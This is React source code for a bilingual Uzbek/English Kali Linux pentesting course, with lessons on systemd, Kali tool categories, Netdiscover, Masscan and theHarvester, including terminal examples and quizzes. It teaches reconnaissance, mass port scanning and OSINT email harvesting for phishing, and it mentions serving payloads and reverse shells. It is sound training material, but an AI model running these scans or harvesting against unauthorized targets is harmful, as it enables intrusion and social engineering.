    React.createElement(Quiz,{q:{uz:"Kali'da IP manzil va interfeyslarni ko'rish uchun zamonaviy buyruq qaysi?",en:"Modern command to see IP and interfaces in Kali?"},opts:[{uz:"ip a",en:"ip a"},{uz:"ls -l",en:"ls -l"},{uz:"cat /ip",en:"cat /ip"},{uz:"ping",en:"ping"}],correct:0,exp:{uz:"ip a (ip address) interfeyslar va ularning IP manzillarini ko'rsatadi — eski ifconfig'ning zamonaviy o'rnini bosadi.",en:"ip a (ip address) lists interfaces and their IPs — the modern replacement for ifconfig."}}));
}
function LessonL09(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Xizmatlar va systemd","Services and systemd")),
    React.createElement(P,null,t(lang,"Xizmat (service) — fonda doimiy ishlab turadigan dastur, masalan veb-server, SSH yoki ma'lumotlar bazasi. Ular foydalanuvchi aralashuvisiz, tizim yonganidan boshlab ishlaydi. Kali systemd nomli tizimni ishlatadi — bu barcha xizmatlarni boshqaradigan \"dispetcher\". Xizmatlar systemctl buyrug'i orqali boshqariladi.","A service is a program that runs continuously in the background, such as a web server, SSH or a database. They run without user interaction, from the moment the system boots. Kali uses a system called systemd — the \"dispatcher\" that manages all services. Services are controlled with the systemctl command.")),
    React.createElement(H2,{num:"§2"},t(lang,"Xizmat hayot tsikli","The service lifecycle")),
    React.createElement(FlowSteps,{title:{uz:"Xizmatni boshqarish",en:"Managing a service"},steps:[
      {icon:"▶",text:{uz:"sudo systemctl start ssh — ishga tushirish",en:"sudo systemctl start ssh — start it"}},
      {icon:"📊",text:{uz:"systemctl status ssh — holatini ko'rish",en:"systemctl status ssh — check status"}},
      {icon:"🔁",text:{uz:"systemctl enable ssh — yuklanishda avtomatik",en:"systemctl enable ssh — auto-start at boot"}},
      {icon:"⏹",text:{uz:"systemctl stop ssh — to'xtatish",en:"systemctl stop ssh — stop it"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"start va enable: qanday farq bor?","start vs enable: what's the difference?")),
    React.createElement(P,null,t(lang,"start xizmatni hozir ishga tushiradi; stop to'xtatadi; restart o'chirib-yoqadi (sozlama o'zgargach kerak bo'ladi); status holatini, so'nggi loglarni va ishlayotgan-yo'qligini ko'rsatadi. enable va disable esa bir marta sozlanadi: enable xizmatni tizim HAR yonganda avtomatik ishga tushirishga sozlaydi, disable buni bekor qiladi. start (bir martalik) va enable (doimiy) farqini tushunish muhim.","start launches the service now; stop stops it; restart cycles it off and on (needed after a config change); status shows its state, recent logs and whether it's running. enable and disable are set once: enable configures the service to auto-start EVERY time the system boots, disable undoes it. Understanding the difference between start (one-time) and enable (permanent) is important.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: reboot'dan keyin nima bo'ladi?","Interactive simulator: what happens after a reboot?")),
    React.createElement(P,null,t(lang,"start va enable orasidagi eng aniq farq — reboot paytida ko'rinadi. Ikkalasini sinang:","The clearest difference between start and enable shows up at reboot. Try both:")),
    React.createElement(ServiceLifecycleSim),
    React.createElement(H2,{num:"§5"},t(lang,"Pentestda kerak bo'ladigan xizmatlar","Services you'll need in a pentest")),
    React.createElement(P,null,t(lang,"Ba'zi xizmatlar pentestda tez-tez ishga tushiriladi: postgresql — Metasploit uning ma'lumotlar bazasini ishlatadi; apache2 yoki tez python3 -m http.server — nishonga fayl (payload) uzatish uchun vaqtinchalik veb-server; ssh — masofaviy kirish uchun. Ularni faqat kerak bo'lganda yoqing.","Some services are started often in a pentest: postgresql — Metasploit uses its database; apache2 or the quick python3 -m http.server — a temporary web server to deliver files (payloads) to the target; ssh — for remote access. Start them only when needed.")),
    React.createElement(H2,{num:"§6"},t(lang,"Loglarni ko'rish","Viewing logs")),
    React.createElement(P,null,t(lang,"Xizmat ishlamasa, sabab ko'pincha loglarda. journalctl -u ssh xizmatning loglarini ko'rsatadi. systemctl status ssh esa oxirgi bir necha log qatorini darhol beradi. Bu — nosozlikni tashxislashning birinchi qadami.","If a service won't work, the reason is usually in the logs. journalctl -u ssh shows the service's logs. systemctl status ssh gives the last few log lines immediately. This is the first step in diagnosing a fault.")),
    React.createElement(Terminal,null,"sudo systemctl start postgresql   # Metasploit uchun\nsudo systemctl status ssh\nsudo systemctl enable ssh         # yuklanishda avto\npython3 -m http.server 8000       # tez veb-server\njournalctl -u apache2 --no-pager | tail"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Xizmatlarni faqat kerak bo'lganda ishga tushiring — doimiy ishlab turgan SSH yoki veb-server sizning mashinangizni ham hujum nishoniga aylantiradi.","Only start services when needed — an always-on SSH or web server turns your own machine into an attack target too.")),
    React.createElement(H2,{num:"§7"},t(lang,"systemctl — qisqacha ma'lumotnoma","systemctl — quick reference")),
    React.createElement(LayerStack,{layers:[{n:"start",name:t(lang,"start","start"),color:"#69db7c",desc:{uz:"Xizmatni hoziroq ishga tushiradi.",en:"Starts the service now."}},{n:"stop",name:t(lang,"stop","stop"),color:"#ff6b6b",desc:{uz:"Xizmatni to'xtatadi.",en:"Stops the service."}},{n:"status",name:t(lang,"status","status"),color:"#4dabf7",desc:{uz:"Holati, PID va oxirgi loglarni ko'rsatadi.",en:"Shows state, PID and recent logs."}},{n:"enable",name:t(lang,"enable","enable"),color:"#ffd43b",desc:{uz:"Har yuklanishda avtomatik ishga tushiradi.",en:"Auto-starts it on every boot."}},]}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: xizmat holati","Practice: service status")),
    React.createElement(P,null,t(lang,"Pentestda ko'pincha o'z Kali'ngizda vaqtincha veb-server yoki SSH ishga tushirasiz (fayl uzatish, reverse shell uchun). status buyrug'i xizmat ishlayotganini tasdiqlaydi.","In a pentest you often start a temporary web server or SSH on your own Kali (for file transfer, reverse shells). The status command confirms the service is running.")),
    React.createElement(Terminal,null,"sudo systemctl start ssh\nsudo systemctl status ssh\n# ● ssh.service - OpenBSD Secure Shell server\n#    Active: active (running) since ...\n#    Main PID: 1337 (sshd)\nsudo systemctl enable ssh   # har yuklanishda"),
    React.createElement(Quiz,{q:{uz:"Xizmatni tizim har yuklanganda avtomatik ishga tushirish uchun qaysi buyruq?",en:"Which command makes a service auto-start at every boot?"},opts:[{uz:"systemctl start",en:"systemctl start"},{uz:"systemctl enable",en:"systemctl enable"},{uz:"systemctl status",en:"systemctl status"},{uz:"systemctl stop",en:"systemctl stop"}],correct:1,exp:{uz:"systemctl enable xizmatni yuklanish vaqtida avtomatik ishga tushirishga sozlaydi; start esa uni faqat hozir bir marta ishga tushiradi.",en:"systemctl enable sets a service to auto-start at boot; start only launches it once now."}}));
}
function LessonL10(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"600+ vosita, tartibli","600+ tools, organized")),
    React.createElement(P,null,t(lang,"Kali'ning kuchi — 600 dan ortiq oldindan o'rnatilgan xavfsizlik vositasida. Bu ulkan to'plam bo'lsa-da, u tartibsiz emas: vositalar pentest bosqichlariga mos toifalarga ajratilgan, va ilovalar menyusi ham xuddi shu toifalar bo'yicha tuzilgan. Bu sizga kerakli vositani tez topishga yordam beradi — masalan \"parol buzish\" kerak bo'lsa, to'g'ridan-to'g'ri Password Attacks toifasiga qaraysiz.","Kali's power is its 600+ pre-installed security tools. Huge as this set is, it isn't chaotic: the tools are grouped into categories matching pentest phases, and the applications menu follows the same categories. This helps you find the right tool fast — if you need to \"crack a password\", you go straight to the Password Attacks category.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy toifalar","Main categories")),
    React.createElement(LayerStack,{layers:[
      {n:"🔍",name:t(lang,"Ma'lumot to'plash","Information Gathering"),color:"#4dabf7",desc:{uz:"Nmap, theHarvester, dnsenum — nishon haqida bilish.",en:"Nmap, theHarvester, dnsenum — learn about the target."}},
      {n:"🕸",name:t(lang,"Veb ilovalar","Web Applications"),color:"#69db7c",desc:{uz:"Burp Suite, sqlmap, Nikto, wpscan — veb zaifliklar.",en:"Burp Suite, sqlmap, Nikto, wpscan — web vulns."}},
      {n:"🔑",name:t(lang,"Parol hujumlari","Password Attacks"),color:"#a855f7",desc:{uz:"Hydra (onlayn), John/Hashcat (oflayn).",en:"Hydra (online), John/Hashcat (offline)."}},
      {n:"💥",name:t(lang,"Ekspluatatsiya","Exploitation"),color:"#ff3a5e",desc:{uz:"Metasploit, searchsploit, SET.",en:"Metasploit, searchsploit, SET."}},
      {n:"📡",name:t(lang,"Sniffing & simsiz","Sniffing & wireless"),color:"#ffd43b",desc:{uz:"Wireshark, Aircrack-ng, Bettercap.",en:"Wireshark, Aircrack-ng, Bettercap."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Toifalar pentest bosqichlariga mos","Categories map to pentest phases")),
    React.createElement(P,null,t(lang,"Bu toifalar tasodifiy emas — ular haqiqiy pentest jarayonining bosqichlarini aks ettiradi: avval Information Gathering (razvedka), keyin Vulnerability Analysis (zaifliklarni topish), so'ng Exploitation (foydalanish), keyin Post Exploitation (kirishdan keyin), va nihoyat Reporting (hisobot). Menyu shu tartibda o'qilsa, u sizga pentest \"yo'l xaritasi\"ni ham o'rgatadi.","These categories aren't random — they mirror the phases of a real pentest: first Information Gathering (recon), then Vulnerability Analysis (finding weaknesses), then Exploitation, then Post Exploitation (after access), and finally Reporting. Read in that order, the menu also teaches you the pentest \"roadmap\".")),
    React.createElement(H2,{num:"§4"},t(lang,"Vositani topish va o'rnatish — asoslar","Finding and installing a tool — the basics")),
    React.createElement(P,null,t(lang,"which nom — vosita o'rnatilganini tekshiradi va yo'lini beradi. Agar o'rnatilmagan bo'lsa, sudo apt install nom bilan o'rnatasiz, yoki metapaket orqali butun toifani (kali-tools-web). Har vosita haqida to'liq ma'lumot kali.org/tools saytida bor — u yerda misollar va bayroqlar tushuntirilgan.","which name — checks that a tool is installed and gives its path. If it's not installed, install it with sudo apt install name, or install a whole category via a metapackage (kali-tools-web). Full info on every tool is at kali.org/tools — with examples and flags explained there.")),
    React.createElement(H2,{num:"§5"},t(lang,"Vosita bilan yordam olish","Getting help with a tool")),
    React.createElement(P,null,t(lang,"Yangi vositani ishlatishdan oldin uni tushunish muhim. man nom to'liq qo'llanma beradi; nom --help yoki nom -h qisqa bayroqlar ro'yxati; ko'p vosita nom -h bilan misollar ham ko'rsatadi. Vositani ko'r-ko'rona ishlatmang — avval nima qilishini va parametrlarini o'rganing.","Before using a new tool, it's important to understand it. man name gives the full manual; name --help or name -h a short list of flags; many tools also show examples with name -h. Don't use a tool blindly — first learn what it does and its parameters.")),
    React.createElement(Terminal,null,"which nmap        # o'rnatilganmi? yo'li qayerda?\nman nmap          # to'liq qo'llanma\nnmap --help       # qisqa yordam\nsudo apt install kali-linux-large   # ko'p vosita metapaketi"),
    React.createElement(H2,{num:"§6"},t(lang,"Interaktiv simulyator: omborda bormi, yo'qmi?","Interactive simulator: in the repo, or not?")),
    React.createElement(P,null,t(lang,"600+ vosita ham hamma narsani qamramaydi. Ikkala ssenariyni sinang — kerakli vosita Kali omborida bo'lgan va bo'lmagan holat qanchalik farq qilishini ko'ring:","Even 600+ tools don't cover everything. Try both scenarios — see how different it is when the tool you need is in the Kali repo versus when it isn't:")),
    React.createElement(ToolSourceSim),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: vosita qidirish","Practice: searching for a tool")),
    React.createElement(P,null,t(lang,"Kali'da 600+ vosita bor, lekin hammasi standart o'rnatilmagan. apt search kerakli vositani topadi; metapaketlar (kali-linux-large) bir yo'la yuzlab vositani o'rnatadi.","Kali has 600+ tools, but not all are installed by default. apt search finds the tool you need; metapackages (kali-linux-large) install hundreds at once.")),
    React.createElement(Terminal,null,"apt search gobuster\n# gobuster/kali-rolling 3.6.0 amd64\n#   Directory/file & DNS busting tool written in Go\nsudo apt install -y kali-linux-large   # ko'plab vositani birdan"),
    React.createElement(Quiz,{q:{uz:"Kali vositalari qanday tartibga solingan?",en:"How are Kali's tools organized?"},opts:[{uz:"Alifbo tartibida",en:"Alphabetically"},{uz:"Pentest bosqichlariga mos toifalar bo'yicha",en:"Into categories matching pentest phases"},{uz:"Fayl hajmi bo'yicha",en:"By file size"},{uz:"Tasodifiy",en:"Randomly"}],correct:1,exp:{uz:"Vositalar ma'lumot to'plash, ekspluatatsiya, parol hujumlari kabi pentest bosqichlariga mos toifalarga ajratilgan — bu menyuni ham \"yo'l xaritasi\" qiladi.",en:"Tools are grouped into categories matching pentest phases like info gathering, exploitation and password attacks — making the menu a \"roadmap\" too."}}));
}
function LessonL12(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Netdiscover nima?","What is Netdiscover?")),
    React.createElement(P,null,t(lang,"Netdiscover — ARP so'rovlari yordamida lokal tarmoqdagi tirik xostlarni topadigan sodda va tezkor vosita. Uning kuchi shundaki, u ping'ga (ICMP) tayanmaydi — shuning uchun ICMP'ni bloklaydigan qurilmalarni ham topadi. Tarmoq xaritasini tuzishning eng birinchi qadami: kim bor va qayerda.","Netdiscover is a simple, fast tool that finds live hosts on the local network using ARP requests. Its strength is that it doesn't rely on ping (ICMP) — so it detects even devices that block ICMP. It's the very first step in mapping a network: who is there and where.")),
    React.createElement(H2,{num:"§2"},t(lang,"ARP orqali topish","Discovery via ARP")),
    React.createElement(PacketFlow,{from:{uz:"Kali",en:"Kali"},to:{uz:"Butun tarmoq",en:"The whole LAN"},label:"ARP who-has",color:"#a855f7"}),
    React.createElement(FlowSteps,{title:{uz:"Netdiscover oqimi",en:"Netdiscover flow"},steps:[
      {icon:"📢",text:{uz:"Tarmoqqa ARP so'rovlari yuboriladi",en:"ARP requests are broadcast to the network"}},
      {icon:"🙋",text:{uz:"Har tirik xost o'z MAC bilan javob beradi",en:"Each live host replies with its MAC"}},
      {icon:"🗺",text:{uz:"IP + MAC + ishlab chiqaruvchi ro'yxatlanadi",en:"IP + MAC + vendor are listed"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Passiv va aktiv rejim","Passive vs active mode")),
    React.createElement(P,null,t(lang,"Netdiscover ikki rejimda ishlaydi. Aktiv rejim (-r bilan diapazon berilganda) o'zi ARP so'rovlarini yuboradi — tez, lekin tarmoqda iz qoldiradi. Passiv rejim (-p) esa hech qanday paket yubormaydi — u shunchaki tarmoqdagi mavjud ARP trafigini tinglaydi va shundan xostlarni aniqlaydi. Passiv rejim deyarli aniqlanmaydi, lekin sekinroq va faqat gaplashayotgan xostlarni ko'radi.","Netdiscover works in two modes. Active mode (when you give a range with -r) sends ARP requests itself — fast, but leaves a trace on the network. Passive mode (-p) sends no packets — it just listens to the existing ARP traffic on the network and identifies hosts from it. Passive mode is nearly undetectable, but slower and only sees hosts that are talking.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: aktiv vs passiv qanday farq qiladi","Interactive simulator: how active differs from passive")),
    React.createElement(P,null,t(lang,"Xuddi shu /24 tarmoqni ikki rejimda sinang — tezlik, to'liqlik va sezilish orasidagi almashinuvni his qiling:","Probe the exact same /24 network in both modes — feel the tradeoff between speed, completeness and detectability:")),
    React.createElement(NetdiscoverModeSim),
    React.createElement(H2,{num:"§5"},t(lang,"Natijani o'qish","Reading the output")),
    React.createElement(P,null,t(lang,"Netdiscover har tirik xost uchun IP manzil, MAC manzil va tarmoq kartasi ishlab chiqaruvchisini (vendor) ko'rsatadi. Vendor ma'lumoti juda foydali: u ko'pincha qurilma turini ochib beradi — masalan \"VMware\" (virtual mashina), \"Cisco\" (router/switch), \"Raspberry Pi\" yoki printer ishlab chiqaruvchisi. Bu sizga nishonlarni ustuvorlashtirishga yordam beradi.","Netdiscover shows an IP address, MAC address and network card vendor for each live host. The vendor info is very useful: it often reveals the device type — e.g. \"VMware\" (a VM), \"Cisco\" (router/switch), \"Raspberry Pi\" or a printer maker. This helps you prioritize targets.")),
    React.createElement(Terminal,null,"sudo netdiscover -r 10.0.0.0/24    # aktiv, aniq diapazon\nsudo netdiscover -i eth0           # interfeys bo'yicha\nsudo netdiscover -p                # passiv (yashirin)"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Faqat o'z tarmog'ingizda yoki ruxsat berilgan muhitda ishlating.","Use only on your own network or an authorized environment.")),
    React.createElement(H2,{num:"§6"},t(lang,"Netdiscover parametrlari","Netdiscover options")),
    React.createElement(LayerStack,{layers:[{n:"-r",name:t(lang,"-r","-r"),color:"#4dabf7",desc:{uz:"Skanerlanadigan tarmoq diapazoni (-r 10.0.0.0/24).",en:"The range to scan (-r 10.0.0.0/24)."}},{n:"-p",name:t(lang,"-p","-p"),color:"#a855f7",desc:{uz:"Passiv rejim — faqat tinglaydi, paket yubormaydi.",en:"Passive mode — only listens, sends nothing."}},{n:"-i",name:t(lang,"-i","-i"),color:"#69db7c",desc:{uz:"Qaysi interfeys (-i eth0).",en:"Which interface (-i eth0)."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: tirik xostlar","Practice: live hosts")),
    React.createElement(P,null,t(lang,"Netdiscover ARP so'rovlari yuborib, javob bergan qurilmalarni ro'yxatlaydi. MAC manzilning birinchi qismi (OUI) ishlab chiqaruvchini oshkor qiladi — bu nishonni tushunishga yordam beradi.","Netdiscover sends ARP requests and lists devices that reply. The first part of the MAC (OUI) reveals the vendor — which helps you understand the target.")),
    React.createElement(Terminal,null,"sudo netdiscover -r 10.0.0.0/24\n# IP           MAC Address        Count  Vendor\n# 10.0.0.1     52:54:00:12:35:00   1     QEMU\n# 10.0.0.5     08:00:27:8a:ff:b9   1     PCS (VirtualBox)\n# 10.0.0.15    00:0c:29:3d:1a:44   1     VMware"),
    React.createElement(Quiz,{q:{uz:"Netdiscover qaysi protokol bilan tirik xostlarni topadi?",en:"Which protocol does Netdiscover use to find live hosts?"},opts:[{uz:"ICMP (ping)",en:"ICMP (ping)"},{uz:"ARP",en:"ARP"},{uz:"DNS",en:"DNS"},{uz:"HTTP",en:"HTTP"}],correct:1,exp:{uz:"Netdiscover ARP so'rovlaridan foydalanadi — shuning uchun u ping'ni (ICMP) bloklaydigan xostlarni ham aniqlaydi.",en:"Netdiscover uses ARP requests — so it detects hosts even if they block ping (ICMP)."}}));
}
function LessonL13(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Masscan nima?","What is Masscan?")),
    React.createElement(P,null,t(lang,"Masscan — dunyodagi eng tezkor port skaneri. U o'zining maxsus TCP/IP stekidan foydalanadi va paketlarni operatsion tizim navbatini kutmasdan yuboradi (asinxron) — shuning uchun teoretik jihatdan butun internetni bir necha daqiqada skanerlay oladi. U Nmap'dan yuzlab marta tez, lekin evaziga kamroq batafsil (versiya/OS aniqlash yo'q).","Masscan is the fastest port scanner in the world. It uses its own custom TCP/IP stack and sends packets without waiting for the OS queue (asynchronously) — so it can theoretically scan the entire internet in minutes. It's hundreds of times faster than Nmap, but in exchange less detailed (no version/OS detection).")),
    React.createElement(H2,{num:"§2"},t(lang,"Masscan + Nmap ish oqimi","The Masscan + Nmap workflow")),
    React.createElement(FlowSteps,{title:{uz:"Tez + batafsil",en:"Fast + detailed"},steps:[
      {icon:"⚡",text:{uz:"Masscan katta diapazonda ochiq portlarni tez topadi",en:"Masscan quickly finds open ports over a large range"}},
      {icon:"📋",text:{uz:"Topilgan portlar ro'yxati olinadi",en:"The list of found ports is collected"}},
      {icon:"🔬",text:{uz:"Nmap o'sha portlarni chuqur tekshiradi (-sV)",en:"Nmap inspects those ports in detail (-sV)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nima uchun bunchalik tez?","Why so fast?")),
    React.createElement(P,null,t(lang,"Oddiy skanerlar har paket uchun operatsion tizimga murojaat qiladi va javobni kutadi — bu sekin. Masscan esa o'z stekini ishlatib, javobni kutmasdan minglab paketni ketma-ket otadi, keyin javoblarni alohida yig'ib oladi. Bu radardan chiqqan signallar kabi — hammasi bir vaqtda yuboriladi. Shuning uchun --rate parametri (sekundiga necha paket) uning tezligini belgilaydi.","Ordinary scanners ask the OS for each packet and wait for a reply — which is slow. Masscan uses its own stack to fire thousands of packets in a row without waiting, then collects the replies separately. It's like signals from a radar — all sent at once. That's why the --rate parameter (packets per second) sets its speed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Tezlikni sozlash — ehtiyotkorlik","Tuning the rate — carefully")),
    React.createElement(P,null,t(lang,"--rate juda kuchli, lekin xavfli parametr. Juda yuqori tezlik (masalan --rate=100000) tarmoq kanalini to'ldirib, xizmatlarni ishdan chiqarishi (tasodifiy DoS), routerlarni charchatishi va sizni darhol aniqlashi mumkin. Amaliyotda o'rtacha tezlikdan boshlang (--rate=1000) va faqat ruxsat berilgan, barqaror tarmoqlarda oshiring.","--rate is a very powerful but dangerous parameter. Too high (e.g. --rate=100000) can flood the network link, knock out services (an accidental DoS), tire out routers and get you detected instantly. In practice start with a moderate rate (--rate=1000) and only raise it on authorized, stable networks.")),
    React.createElement(Terminal,null,"sudo masscan 10.0.0.0/24 -p22,80,443 --rate=1000\nsudo masscan 10.0.0.5 -p0-65535 --rate=10000 -oL out.txt\n# keyin topilgan portlarni Nmap bilan chuqur tekshirish:\nnmap -sV -p22,80,443 10.0.0.5"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"--rate ni ehtiyotkorlik bilan sozlang — juda yuqori tezlik xizmatlarni ishdan chiqarishi (DoS) va sizni darhol aniqlashi mumkin. Faqat ruxsat berilgan tarmoqlarda.","Set --rate carefully — too high can knock out services (DoS) and get you detected instantly. Only on authorized networks.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: ehtiyotkor vs beparvo tezlik","Interactive simulator: careful vs reckless rate")),
    React.createElement(P,null,t(lang,"§4 dagi ogohlantirishni his qiling — xuddi shu tarmoqni ikki xil --rate bilan skanerlang:","Feel the §4 warning for yourself — scan the exact same network with two very different --rate values:")),
    React.createElement(MasscanRateSim),
    React.createElement(H2,{num:"§6"},t(lang,"Masscan va Nmap — vazifa taqsimoti","Masscan vs Nmap — division of labor")),
    React.createElement(CompareCols,{left:{title:{uz:"Masscan",en:"Masscan"},color:"#ff3a5e",rows:[{uz:"Ultra-tez — millionlab port/sekund",en:"Ultra-fast — millions of ports/sec"},{uz:"Faqat OCHIQ portlarni topadi",en:"Only finds OPEN ports"},{uz:"Keng diapazon uchun",en:"For a wide range"},]},right:{title:{uz:"Nmap",en:"Nmap"},color:"#69db7c",rows:[{uz:"Sekinroq, lekin chuqur",en:"Slower but deep"},{uz:"Xizmat/versiya/NSE",en:"Service/version/NSE"},{uz:"Topilgan portlarga fokus",en:"Focus on found ports"},]}}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: ikki bosqichli ish oqimi","Practice: the two-stage workflow")),
    React.createElement(P,null,t(lang,"Avval Masscan bilan butun diapazonni tez skanerlab ochiq portlarni topamiz, so'ng faqat o'sha portlarni Nmap bilan chuqur tekshiramiz. Bu tezlik va chuqurlikni birlashtiradi.","First scan the whole range fast with Masscan to find open ports, then deep-inspect only those ports with Nmap. This combines speed and depth.")),
    React.createElement(Terminal,null,"sudo masscan -p1-65535 10.0.0.0/24 --rate=10000\n# Discovered open port 80/tcp on 10.0.0.5\n# Discovered open port 22/tcp on 10.0.0.5\nnmap -sV -p22,80 10.0.0.5   # faqat topilgan portlar"),
    React.createElement(Quiz,{q:{uz:"Masscan va Nmap odatda qanday birga ishlatiladi?",en:"How are Masscan and Nmap typically used together?"},opts:[{uz:"Masscan tez topadi, Nmap chuqur tekshiradi",en:"Masscan finds fast, Nmap inspects deeply"},{uz:"Ikkalasi bir xil ish",en:"They do the same job"},{uz:"Ular birga ishlamaydi",en:"They can't work together"},{uz:"Nmap avval bekor qiladi",en:"Nmap cancels it"}],correct:0,exp:{uz:"Masscan katta diapazonda ochiq portlarni tez aniqlaydi, so'ng Nmap o'sha portlarni versiya/xizmat uchun batafsil skanerlaydi.",en:"Masscan rapidly finds open ports over a large range, then Nmap scans them in detail for version/service."}}));
}
function LessonL15(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"theHarvester nima?","What is theHarvester?")),
    React.createElement(P,null,t(lang,"theHarvester — ochiq manba razvedkasi (OSINT) vositasi. U ochiq, ommaga oshkor manbalardan (qidiruv tizimlari, PGP serverlari, sertifikat jurnallari, Shodan) nishon tashkilotning email manzillari, subdomenlari, xodim ismlari va IP'larini to'playdi — va eng muhimi, nishonga hech qanday paket yubormasdan. Bu \"passiv\" razvedka: nishon sizni umuman sezmaydi.","theHarvester is an open-source intelligence (OSINT) tool. It gathers a target organization's email addresses, subdomains, employee names and IPs from public, openly available sources (search engines, PGP servers, certificate logs, Shodan) — and crucially, without sending any packets to the target. This is \"passive\" recon: the target never notices you.")),
    React.createElement(H2,{num:"§2"},t(lang,"Passiv razvedka oqimi","Passive recon flow")),
    React.createElement(FlowSteps,{title:{uz:"theHarvester",en:"theHarvester"},steps:[
      {icon:"🌐",text:{uz:"Ochiq manbalarni so'rash (Google, Bing, crt.sh)",en:"Query public sources (Google, Bing, crt.sh)"}},
      {icon:"📧",text:{uz:"Email va subdomenlar yig'iladi",en:"Emails and subdomains are collected"}},
      {icon:"🕵",text:{uz:"Nishon buni sezmaydi (passiv)",en:"The target never notices (passive)"}},
      {icon:"📄",text:{uz:"Natija keyingi hujum uchun ro'yxat bo'ladi",en:"Results become a list for later attacks"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nega passiv razvedka qimmatli?","Why passive recon is valuable")),
    React.createElement(P,null,t(lang,"Passiv razvedka pentestning eng birinchi va eng xavfsiz bosqichi — nishonga tegmasdan ko'p narsa bilib olasiz. Topilgan email manzillar keyingi fishing yoki parol hujumlari uchun foydalanuvchi ro'yxati bo'lib xizmat qiladi (masalan aziz@example.com dan aziz login nomini taxmin qilish mumkin). Xodim ismlari ijtimoiy muhandislik uchun, subdomenlar esa yangi hujum yuzasi uchun ishlatiladi.","Passive recon is the first and safest phase of a pentest — you learn a lot without touching the target. Discovered email addresses serve as a username list for later phishing or password attacks (e.g. from alice@example.com you can guess the login name alice). Employee names are used for social engineering, and subdomains as a new attack surface.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: oshkor vs gigienik kompaniya","Interactive simulator: exposed vs hygienic company")),
    React.createElement(P,null,t(lang,"Hujumchining harakati bir xil — natija esa nishonning o'z ochiqligiga bog'liq. Ikkala kompaniyani sinang:","The attacker's action is identical — the result depends entirely on how exposed the target itself is. Try both companies:")),
    React.createElement(OSINTExposureSim),
    React.createElement(H2,{num:"§5"},t(lang,"Manbalar va crt.sh","Sources and crt.sh")),
    React.createElement(P,null,t(lang,"theHarvester -b bilan qaysi manbadan qidirishni tanlaysiz: google, bing, duckduckgo, linkedin va boshqalar. Ayniqsa qimmatlisi — crtsh manbasi: u SSL sertifikat shaffoflik jurnallaridan subdomenlarni topadi. Nega bu kuchli? Chunki har bir HTTPS sayti sertifikat oladi, va bu sertifikatlar ochiq jurnallarga yoziladi — shuning uchun crt.sh ko'pincha kompaniya yashirmoqchi bo'lgan ichki subdomenlarni ham ochib beradi.","With theHarvester -b you choose which source to query: google, bing, duckduckgo, linkedin and others. Especially valuable is the crtsh source: it finds subdomains from SSL certificate transparency logs. Why is it powerful? Because every HTTPS site gets a certificate, and those certificates are written to public logs — so crt.sh often reveals even the internal subdomains a company meant to hide.")),
    React.createElement(Terminal,null,"theHarvester -d example.com -b google\ntheHarvester -d example.com -b bing,duckduckgo,crtsh\ntheHarvester -d example.com -b all -f natija   # HTML/XML ga saqlash"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"crt.sh manbasi SSL sertifikat jurnallaridan subdomenlarni topadi — bu ko'pincha yashirin ichki subdomenlarni ham ochib beradi.","The crt.sh source finds subdomains from SSL certificate logs — often revealing hidden internal subdomains too.")),
    React.createElement(H2,{num:"§6"},t(lang,"theHarvester manbalari","theHarvester sources")),
    React.createElement(LayerStack,{layers:[{n:"google",name:t(lang,"google","google"),color:"#4dabf7",desc:{uz:"Qidiruv natijalaridan email/subdomen.",en:"Emails/subdomains from search results."}},{n:"crtsh",name:t(lang,"crt.sh","crt.sh"),color:"#69db7c",desc:{uz:"Sertifikat shaffofligidan subdomenlar.",en:"Subdomains from certificate transparency."}},{n:"linkedin",name:t(lang,"linkedin","linkedin"),color:"#a855f7",desc:{uz:"Xodimlar ismlari (ijtimoiy muhandislik uchun).",en:"Employee names (for social engineering)."}},{n:"dns",name:t(lang,"dns","dns"),color:"#ffd43b",desc:{uz:"DNS orqali xostlar.",en:"Hosts via DNS."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: passiv razvedka","Practice: passive recon")),
    React.createElement(P,null,t(lang,"theHarvester nishon bilan to'g'ridan-to'g'ri aloqa qilmasdan (passiv) ochiq manbalardan email, subdomen va xostlarni yig'adi — shuning uchun nishon buni sezmaydi.","theHarvester gathers emails, subdomains and hosts from open sources without contacting the target directly (passive) — so the target never notices.")),
    React.createElement(Terminal,null,"theHarvester -d example.com -b crtsh,dns\n# [*] Emails found:\n#   admin@example.com\n#   info@example.com\n# [*] Hosts found:\n#   mail.example.com  vpn.example.com  dev.example.com"),
